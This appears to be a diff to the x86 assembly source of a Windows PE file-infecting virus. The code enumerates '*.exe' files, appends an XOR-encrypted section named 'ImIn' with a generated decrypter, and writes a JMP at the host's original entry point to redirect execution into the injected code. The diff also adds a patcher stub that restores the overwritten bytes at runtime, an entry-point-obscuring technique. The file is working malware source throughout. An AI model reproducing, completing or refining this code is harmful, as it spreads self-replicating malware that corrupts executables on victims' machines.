@@ -73,6 +73,19 @@ nop
 nop
 nop
 nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+endPatcher:
 
 ; Jmp data
 jmp	start
@@ -83,8 +96,12 @@ DebugDone		db		"Done", 0 ; TODO remove
 SearchFolder		db		"*.exe", 0
 HandleSearch		dd		?
 NewSectionName		db		"ImIn", 0
+XorCrypt		dd		?
 
 ; PE
+OffsetCodeSecEP		dd	?
+CodeSecRawData		dd	?
+CodeSecVA		dd	?
 BaseImage		dd	?
 OldEntryPoint		dd	?
 PeFile			dd	?
@@ -102,6 +119,7 @@ NewSectionCodeSize	dd	?
 VirtualAddress		dd	?
 SizeOfRawData		dd	?
 PointerToRawData	dd	?
+CodeSecHeader		dd	?
 
 ; DLL
 sCreateFileMapping	db	'CreateFileMappingA', 0 
@@ -298,8 +316,13 @@ mov	[DELTA PeSectionNb], eax
 xor	ecx, ecx
 mov	cx, word ptr[eax]
 
+; GET ENTRY POINT
+add	eax, 022h
+mov	esi, [eax]
+mov	[DELTA OldEntryPoint], esi
+
 ; GET IMAGE BASE
-add	eax, 02Eh
+add	eax, 0Ch
 mov	esi, [eax]
 mov	[DELTA BaseImage], esi
 
@@ -319,9 +342,21 @@ mov	[DELTA PeStartHeader], esi
 mov	ebx, esi ; Keep start of Headers
 mov	[DELTA LastSec], 0
 Loop_SectionHeader:
-; GET LAST SECTION
+; GET LAST SECTION & CODE SECTION
 mov	eax, esi
 add	eax, 0Ch
+; CHECK IF SECTION IS ENTRY POINT (CODE) (Check if it's contained within section)
+mov	edx, [eax]
+cmp	edx, [DELTA OldEntryPoint]
+jg	notSectionCode ; Entry point is greater
+mov	edi, eax
+add	edi, 04h ; Getting size of raw data
+add	edx, [edi]
+cmp	edx, [DELTA OldEntryPoint]
+jl	notSectionCode ; Entry point is not in the section
+mov	[DELTA CodeSecHeader], esi
+notSectionCode:
+; CHECK IF SECTION IS THE LAST ONE
 cmp	[DELTA LastSec], eax
 jg	keepLastSec
 mov	[DELTA LastSecHeader], esi
@@ -414,6 +449,24 @@ or	ecx, IMAGE_SCN_MEM_WRITE
 or	ecx, IMAGE_SCN_MEM_EXECUTE
 or	ecx, IMAGE_SCN_CNT_CODE
 mov	[edi], ecx
+; Same thing for our old entry point (+ Get some values)
+; Get VA of old code
+mov	edx, [DELTA CodeSecHeader]
+add	edx, 0Ch
+mov	eax, [edx]
+mov	[DELTA CodeSecVA], eax
+; Get Ptr Raw data
+add	edx, 08h
+mov	eax, [edx]
+mov	[DELTA CodeSecRawData], eax
+; Getting the offset between the entry point and the section
+mov	eax, [DELTA OldEntryPoint]
+sub	eax, [DELTA CodeSecVA]
+mov	[DELTA OffsetCodeSecEP], eax
+mov	eax, [DELTA OffsetCodeSecEP]
+; Characteristics
+add	edx, 010h
+mov	[edx], ecx
 
 
 ; CHANGE PE PROPERTIES
@@ -422,8 +475,7 @@ add	eax, 01Ch
 ; CHANGE ENTRY POINT
 add	eax, 0Ch
 mov	edi, [eax]
-mov	[DELTA OldEntryPoint], edi
-mov	[eax], esi
+; mov	[eax], esi
 ; CHANGE SIZE OF IMAGE
 xor	edi, edi
 getSizeRawDataAligned:
@@ -475,41 +527,18 @@ mov	[DELTA PeFileMap], eax
 ; CREATING ENCRYPTER
 mov	eax, 255 ; Maximum xoring
 call	random
-mov	edx, eax
-
-; INSERTING NEW SECTION - OPCODE COPY
-mov	ecx, [DELTA SizeOfRawData]
-mov	edi, [DELTA PeFileMap] ; Destination bytes
-add	edi, [DELTA PointerToRawData]
-mov	esi, toInject ; Source bytes
-add	esi, ebp
-createNewSection:
-lodsb
-xor	eax, edx ; Encrypt
-stosb
-loop	createNewSection
-
-; CREATING JUMP TO OLD ENTRY POINT
-mov	edi, errorExit - toInject ; Offset jmp
-add	edi, [DELTA PeFileMap] ; Add base filemap
-add	edi, [DELTA PointerToRawData] ; Add section offset
-mov	eax, 0E9h ; Push imm32 OPCODE
-xor	eax, edx ; Encrypt
-stosb
-mov	eax, [DELTA OldEntryPoint] ; Entry point address
-sub	eax, [DELTA VirtualAddress]
-mov	esi, errorExit - toInject
-sub	eax, esi
-sub	eax, 05h ; Add 5 bytes for JMP
 ; Set same byte for all 4 bytes of EDX
-rol	edx, 8
-mov	dl, dh
-rol	edx, 8
-mov	dl, dh
-rol	edx, 8
-mov	dl, dh
-xor	eax, edx ; encrypt
-stosd
+rol	eax, 8
+mov	al, ah
+rol	eax, 8
+mov	al, ah
+rol	eax, 8
+mov	al, ah
+nop
+nop
+nop
+nop
+mov	[DELTA XorCrypt], eax
 
 ; CREATING DECRYPTER
 DECRYPTER_SIZE = 25
@@ -517,7 +546,7 @@ mov	edi, [DELTA PeFileMap]
 add	edi, [DELTA PointerToRawData]
 mov	eax, 0BFh ; Mov edi
 stosb
-mov	eax, DECRYPTER_SIZE ; Decrypter Size
+mov	eax, DECRYPTER_SIZE + PATCHER_SIZE ; Decrypter Size
 add	eax, [DELTA BaseImage]
 add	eax, [DELTA VirtualAddress] ; Address of our section
 stosd
@@ -529,7 +558,7 @@ mov	eax, 0ACh ; lodsb opcode
 stosb
 mov	eax, 035h ; xor opcode
 stosb
-mov	eax, edx ; random xor
+mov	eax, [DELTA XorCrypt] ; random xor
 stosd
 mov	eax, 0AAh ; stosb
 stosb
@@ -537,13 +566,89 @@ mov	eax, 041h ; inc ecx
 stosb
 mov	eax, 0F981h ; cmp ecx
 stosw
-mov	eax, endInject - toInject - DECRYPTER_SIZE
+mov	eax, endInject - toInject - DECRYPTER_SIZE - PATCHER_SIZE
 stosd
 mov	eax, 075h ; Je
 stosb
 mov	eax, -DECRYPTER_SIZE + 9
 stosb
 
+; CREATE REVERT PATCH ON OLD ENTRY POINT
+PATCHER_SIZE = 17
+; Patch
+mov	edi, [DELTA PeFileMap]
+add	edi, [DELTA PointerToRawData]
+add	edi, DECRYPTER_SIZE ; After decrypter add our patch
+mov	eax, 0B8h ; Mov eax, imm32
+stosb
+mov	eax, [DELTA OldEntryPoint]
+add	eax, [DELTA BaseImage] ; Base + Old EP
+stosd
+mov	eax, 000C7h ; Mov dword ptr [eax], imm32
+stosw
+; Get first 4 bytes to repatch
+mov	ebx, [DELTA PeFileMap]
+add	ebx, [DELTA CodeSecRawData]
+add	ebx, [DELTA OffsetCodeSecEP]
+mov	eax, offset OffsetCodeSecEP
+mov	eax, OffsetCodeSecEP
+mov	eax, [ebx]
+stosd
+; Patch the last byte
+mov	eax, 0C083h ; Add eax
+stosw
+mov	eax, 04h
+stosb
+mov	eax, 000C6h ; Mov byte ptr [eax], imm8
+stosw
+add	ebx, 4
+mov	al, [ebx]
+stosb
+
+; INSERTING NEW SECTION - OPCODE COPY WITH ENCRYPTION
+mov	ecx, endInject - endPatcher
+mov	edi, [DELTA PeFileMap] ; Destination bytes
+add	edi, [DELTA PointerToRawData]
+add	edi, DECRYPTER_SIZE + PATCHER_SIZE
+mov	esi, endPatcher ; Source bytes
+add	esi, ebp
+createNewSection:
+lodsb
+xor	eax, [DELTA XorCrypt] ; Encrypt
+stosb
+loop	createNewSection
+
+; CREATING JUMP TO OLD ENTRY POINT
+mov	eax, [DELTA OldEntryPoint] ; Entry point address
+sub	eax, [DELTA VirtualAddress]
+mov	edi, errorExit - toInject ; Offset jmp
+add	edi, [DELTA PeFileMap] ; Add base filemap
+add	edi, [DELTA PointerToRawData] ; Add section offset
+mov	eax, 0E9h ; JMP rel32 OPCODE
+xor	eax, [DELTA XorCrypt] ; Encrypt
+stosb
+mov	eax, [DELTA OldEntryPoint] ; Entry point address
+sub	eax, [DELTA VirtualAddress]
+mov	esi, errorExit - toInject
+sub	eax, esi
+sub	eax, 05h ; Add 5 bytes for JMP
+xor	eax, [DELTA XorCrypt] ; encrypt
+stosd
+
+
+; SETTING JUMP ON FIRST SECTION POINTING TO US
+; Setting where we place our jmp (section + offset EP if needed)
+mov	edi, [DELTA PeFileMap]
+add	edi, [DELTA CodeSecRawData] ; filemap + pointer to raw data of code section
+add	edi, [DELTA OffsetCodeSecEP] ; offset of EP
+; JUMP!JUMP!JUMP!
+mov	eax, 0E9h ; JMP rel32 OPCODE
+stosb
+mov	eax, [DELTA VirtualAddress]
+sub	eax, [DELTA CodeSecVA]
+sub	eax, [DELTA OffsetCodeSecEP] ; addr rel = Our VA - their VA - offset EP
+sub	eax, 05h ; Remove 5 bytes for JMP
+stosd
 
 
 ; DEBUG FILE INJECTED - TODO REMOVE
